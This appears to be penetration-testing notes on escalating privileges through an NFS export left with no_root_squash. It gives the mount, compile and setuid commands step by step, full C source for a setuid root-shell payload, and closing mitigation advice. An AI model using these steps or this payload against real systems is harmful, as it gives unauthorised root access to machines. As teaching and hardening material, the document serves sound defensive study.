Weak NFS Privileges Exploit
Overview:
NFS (Network File System) allows file sharing across systems. When misconfigured with the no_root_squash option, it becomes vulnerable to privilege escalation.

Key Points:

NFS exports can be listed with:
    showmount -e <target-ip>

If export is set with rw,no_root_squash, it allows remote root users to:

Mount the share
Write files as root
Upload SUID binaries to gain root shell

Exploit Steps:

On attacker machine (as root):
    mount -t nfs <target-ip>:/tmp /mnt
    gcc shell.c -o shell    # setuid shell binary
          if this didnt work, use
              sudo apt install musl-tools
              musl-gcc -static -o shell_musl shell.c
    cp shell /mnt
    chmod u+s /mnt/shell

On victim machine (as normal user):
    /tmp/shell   # Spawns root shell due to SUID
   

Payload Example (C Code):

        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        #include <stdlib.h>
        
        int main(void)
        {
          setuid(0); setgid(0); system("/bin/bash");
        }


Why It Works:

no_root_squash trusts remote root users.

SUID binaries created by root on the share execute with root privileges.

Mitigation:

Never use no_root_squash in production.

Restrict NFS exports to specific IPs.

Use root_squash (default) and proper file permissions.
